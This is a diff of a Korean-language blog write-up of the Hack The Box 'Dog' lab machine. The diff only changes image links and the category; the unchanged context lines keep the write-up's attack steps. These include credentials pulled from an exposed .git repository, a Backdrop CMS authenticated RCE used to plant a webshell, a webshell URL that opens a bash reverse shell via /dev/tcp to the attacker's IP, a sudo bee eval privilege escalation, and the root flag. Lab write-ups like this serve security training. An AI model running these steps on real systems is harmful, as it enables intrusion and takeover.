@@ -2,9 +2,9 @@
 slug: "dog"
 title: "dog"
 date: 2026-07-21
-category: "HTB"
+category: "리눅스"
 tags: []
-excerpt: "그리고 gobuster 결과가 개많이 나왔음 ![[Pasted image 20260721145818.png|455]] ##### Initial Foothold 벡터: 노출된…"
+excerpt: "그리고 gobuster 결과가 개많이 나왔음 Pasted image 20260721145818.png ##### Initial Foothold 벡터: 노출된 `.git` →…"
 readingTime: 5
 ---
 
@@ -22,7 +22,7 @@ readingTime: 5
 -> backdropcms 라는 거에서 생성된 사이트라고 함 -> 일단 backdropcms 버전을 .git에서 보는게 좋을듯?
 
 그리고 gobuster 결과가 개많이 나왔음
-![[Pasted image 20260721145818.png|455]]
+![](assets/images/posts/Pasted%20image%2020260721145818.png)
 ##### Initial Foothold
 벡터: 노출된 `.git` → 크레덴셜 탈취 → CMS 로그인 → 인증 후 RCE로 웹쉘
 명령어:
@@ -30,7 +30,7 @@ readingTime: 5
 
 `/core/themes/stark/stark.info` 파일을 보니 얘가 `backdrop cms 1.27.1` 버전을 사용중이라는 것을 알 수 있었음
 -> CMS는 `contents manage system`의 약자
-![[Pasted image 20260721145930.png]]
+![](assets/images/posts/Pasted%20image%2020260721145930.png)
 마침 이 버전에 [RCE 취약점](https://www.exploit-db.com/exploits/52021)이 있다고 함
 근데 이게 일단 로그인을 해야 되는 취약점이라 CVE는 못받음
 
@@ -55,14 +55,14 @@ git show 8204779c764abd4c9d8d95038b6d22b6a7515afa:settings.php
 ```sh
 git show 8204779c764abd4c9d8d95038b6d22b6a7515afa | grep dog.htb
 ```
-![[Pasted image 20260721192018.png|406]]
+![](assets/images/posts/Pasted%20image%2020260721192018.png)
 -> `tiffany:BackDropJ2024DS2024`
 이걸로 로그인 성공
 
 이제 위에서 본 exploit을 이용해서 리버스쉘을 실행해볼거임
-![[Pasted image 20260721192650.png]]
+![](assets/images/posts/Pasted%20image%2020260721192650.png)
 -> 여기서 나온 zip 파일을 웹에 install 시키면 되는데 이 웹앱에선 zip을 안받는다고 함
-![[Pasted image 20260721192428.png|407]]
+![](assets/images/posts/Pasted%20image%2020260721192428.png)
 시키는데로 익스플로잇으로 생성된 디렉토리를 tar로 재압축 후에 다시 install
 ```sh
 tar cvf shell.tar shell
@@ -74,12 +74,12 @@ nc -lnvp 5555
 ```
 http://10.129.9.200/modules/shell/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.28/5555%200%3E%261%27`
 ```
-![[Pasted image 20260721192915.png|541]]
-![[Pasted image 20260721193110.png]]
+![](assets/images/posts/Pasted%20image%2020260721192915.png)
+![](assets/images/posts/Pasted%20image%2020260721193110.png)
 -> 근데 읽어지지가 않음 웹쉘이라 그런듯 함.
 
 혹시 몰라서 
-![[Pasted image 20260721193234.png|444]]
+![](assets/images/posts/Pasted%20image%2020260721193234.png)
 해보니까 성공했고 답답하니까 쉘 업그레이드 ㄱㄱ 
 ```
 script -qc bash /dev/null
@@ -96,12 +96,12 @@ sudo -l
 ```
 bee는 [Backdrop cms](https://github.com/backdrop-contrib/bee)의 CLI 라고 함
 [sudo "bee" cli privesc](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html) : 검색해보니까 이런 사이트가 있었고
-![[Pasted image 20260721193759.png|449]]
+![](assets/images/posts/Pasted%20image%2020260721193759.png)
 그래서 이걸 그대로 해봄
 ```sh
 sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
 ```
-![[Pasted image 20260721193850.png|344]]
+![](assets/images/posts/Pasted%20image%2020260721193850.png)
 > **root.txt :** 3eaf8499ab8ee6461ece9ca12983f806
 ##### Rabbit Hole (막혔던 것)
 
